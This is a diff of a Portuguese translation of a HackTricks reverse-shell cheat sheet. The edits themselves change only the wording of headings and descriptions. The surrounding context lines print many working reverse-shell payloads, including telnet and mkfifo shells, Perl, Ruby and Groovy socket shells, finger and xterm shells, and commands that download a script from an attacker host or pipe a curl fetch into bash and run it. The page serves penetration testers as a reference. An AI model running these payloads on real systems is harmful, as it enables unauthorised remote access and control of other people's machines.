@@ -24,7 +24,7 @@ Encontre vulnerabilidades que mais importam para que você possa corrigi-las mai
 
 **Se você tiver dúvidas sobre algum desses shells, você pode verificá-los em** [**https://explainshell.com/**](https://explainshell.com)
 
-## Full TTY
+## TTY Completo
 
 **Depois de obter um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**
 
@@ -67,16 +67,17 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Avançado
 
-Pode encontrar casos em que tenha uma **Execução Remota de Código em um aplicativo da web em uma máquina Linux**, mas devido a regras do Iptables ou outros tipos de filtragem, **não consegue obter um shell reverso**. Este "shell" permite que mantenha um shell PTY através dessa RCE usando pipes dentro do sistema da vítima.\
+Se você encontrar uma **vulnerabilidade RCE** em um aplicativo da web baseado em Linux, pode haver casos em que **obter um shell reverso se torne difícil** devido à presença de regras do Iptables ou outros filtros. Em tais cenários, considere criar um shell PTY dentro do sistema comprometido usando pipes.
+
 Você pode encontrar o código em [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
-Apenas precisa modificar:
+Você só precisa modificar:
 
-- A URL do host vulnerável
-- O prefixo e sufixo da sua carga útil (se houver)
-- A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)
+* A URL do host vulnerável
+* O prefixo e sufixo de sua carga útil (se houver)
+* A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)
 
-Depois, pode simplesmente **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3 segundos).
+Então, você pode simplesmente **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
 
 ## Netcat
 ```bash
@@ -94,7 +95,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet é um protocolo de rede que permite a comunicação com um dispositivo remoto ou servidor usando um terminal virtual. É comumente usado para acesso remoto a servidores e dispositivos de rede para fins de administração e configuração.
+Telnet é um protocolo de rede que permite a comunicação bidirecional interativa entre dois dispositivos. É comumente usado para acessar remotamente servidores e dispositivos de rede para fins de administração e configuração.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -128,7 +129,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PO
 ```
 ## Ruby
 
-Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is often used for web development, automation, and scripting.
+Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write, making it a popular choice for web development and scripting. Ruby is known for its object-oriented approach and has a strong community that contributes to its libraries and frameworks.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -269,6 +270,8 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
+
+Gawk é uma ferramenta poderosa de manipulação de texto que pode ser usada para automatizar tarefas repetitivas no Linux. É especialmente útil para processar e extrair informações de arquivos de texto de forma eficiente.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -293,17 +296,16 @@ close(Service)
 ```
 ## Xterm
 
-Uma das formas mais simples de shell reverso é uma sessão xterm. O comando a seguir deve ser executado no servidor. Ele tentará se conectar de volta para você (10.0.0.1) na porta TCP 6001.
+Isso tentará se conectar ao seu sistema na porta 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Para capturar o xterm de entrada, inicie um X-Server (:1 - que escuta na porta TCP 6001). Uma maneira de fazer isso é com o Xnest (para ser executado em seu sistema):
+Para capturar o shell reverso, você pode usar (que estará ouvindo na porta 6001):
 ```bash
-Xnest :1
-```
-Você precisará autorizar o alvo a se conectar a você (comando também executado em seu host):
-```bash
+# Authorize host
 xhost +targetip
+# Listen
+Xnest :1
 ```
 ## Groovy
 
@@ -314,15 +316,12 @@ int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## Bibliografia
+## Referências
+* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
+* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
-
-{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}
-
-{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
-
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
@@ -338,9 +337,9 @@ Encontre as vulnerabilidades mais importantes para que você possa corrigi-las m
 Outras maneiras de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
